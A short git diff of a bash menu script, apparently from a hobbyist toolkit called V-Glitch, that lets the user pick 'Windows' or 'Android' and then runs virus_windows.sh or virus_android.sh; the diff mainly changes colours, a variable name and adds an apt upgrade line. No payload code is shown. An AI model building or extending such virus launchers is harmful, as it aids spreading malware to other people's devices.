@@ -1,5 +1,6 @@
 #!/usr/bin/bash
 #import sys os
+apt update&&apt upgrade -y
 pkg install figlet -y
 pkg install toilet -y
 blue='\033[34;1m'
@@ -16,23 +17,24 @@ echo "Fb : https://www.facebook.com/Ace.of.spades729"
 echo "IG : fajar_firdaus_7"
 echo "YT : iTech7732"
 echo "<==========================================>"
-toilet -f graffiti.flf Silahkan Pilih Virus nya
-echo "1.> Windows"
-echo "2.> Android"
-echo "0.> exit"
-read -p "root@V-Glitch-#" asw
+echo '\033[34;1m'
+echo $blue "1.> Windows"
+echo $blue "2.> Android"
+echo $blue "0.> exit"
+echo '\033[34;1m'
+read -p "root@V-Glitch-#" code
 
-if [ $asw = 1 ] || [ $asw = 1 ]
+if [ $code = 1 ] || [ $code = 1 ]
 then
 sh virus_windows.sh
 fi
 
-if [ $asw = 2 ] || [ $asw = 2 ]
+if [ $code = 2 ] || [ $code = 2 ]
 then
 sh virus_android.sh
 fi
 
-if [ $asw = 0 ] || [ $asw = 0 ]
+if [ $code = 0 ] || [ $code = 0 ]
 then
 clear
 figlet Exit
